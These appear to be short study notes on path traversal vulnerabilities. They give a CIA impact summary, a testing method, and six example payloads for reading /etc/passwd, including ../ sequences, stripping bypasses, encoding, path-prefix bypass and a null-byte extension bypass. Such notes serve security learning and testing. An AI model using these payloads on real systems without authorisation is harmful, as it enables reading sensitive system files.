CIA
Confidentiality: You can read files on the system
Integrity: Only if you can run commands and alter the file system
Availabilty: Only if you can run commands to delete files (It becomes an RCE vulnerability)


1. Map the application
2. Identify functions that retrieve data from the server
3. Test for different payloads


1. simple payload => ../../../../../etc/passwd
2. Absolute path => /etc/passwd
3. Stripping traversal sequences non-recursively => ....//....//....//....//etc/passwd
4. URL encoding or double URL encoding (try other non-standard encodings)
5. Start of path validation bypass => /this-is/the/required-path/../../../etc/passwd
6. Bypass file extension using a null byte => ../../../etc/passwd%00.jpg
The null byte tells the application to ignore anything after it. (does not work for all programming languages)
